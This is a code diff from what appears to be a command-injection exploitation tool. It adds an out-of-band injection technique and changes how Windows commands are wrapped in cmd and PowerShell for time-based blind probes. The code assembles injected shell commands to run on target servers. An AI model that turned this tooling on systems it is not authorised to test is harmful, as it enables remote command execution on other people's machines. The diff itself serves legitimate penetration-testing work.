@@ -31,6 +31,8 @@ def select_injector(technique):
     from src.core.injections.blind.techniques.time_based import tb_injector as injector
   elif technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
     from src.core.injections.semiblind.techniques.file_based import fb_injector as injector
+  elif technique == settings.INJECTION_TECHNIQUE.OOB:
+    from src.core.injections.blind.techniques.oob import oob_injector as injector
   else:
     from src.core.injections.semiblind.techniques.tempfile_based import tfb_injector as injector
   return injector
@@ -55,11 +57,13 @@ def windows_transform_cmd(cmd, technique, interpreter):
       cmd = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; print len(os.popen('cmd /c " + cmd + "').read().strip())\""
     else:
       cmd = checks.quoted_cmd(cmd)
-  else:
-    if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
-      cmd = "powershell.exe -InputFormat none write-host ([string](cmd /c " + cmd + ")).trim().length"
-    else:
-      cmd = "powershell.exe -InputFormat none write-host ([string](cmd /c " + cmd + ")).trim()"
+  elif technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
+    # 'write', not 'write-host': the value is read back off the payload's own standard output, and
+    # only the newer PowerShell writes what the latter prints there at all.
+    cmd = "powershell.exe -InputFormat none write ([string](cmd /c " + cmd + ")).trim().length"
+  # The tempfile-based payloads wrap the command themselves, in the one PowerShell they already
+  # start - wrapping it here as well would cost a second process per probe, and the timing
+  # measurement pays for every one of them.
   return cmd, previous_cmd
 
 """
@@ -67,6 +71,8 @@ Build a cache-less execute_cmd(cmd) -> output callback around the injector model
 """
 def make_simple_execute_cmd(injector, separator, maxlen, TAG, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, interpreter, filename, url_time_response, technique, OUTPUT_TEXTFILE, postprocess_time=lambda shell: shell, catch_time_error=False):
   def execute_cmd(cmd):
+    if technique == settings.INJECTION_TECHNIQUE.OOB:
+      return injector.injection(separator, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter)
     if settings.TIME_RELATED_ATTACK:
       try:
         if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
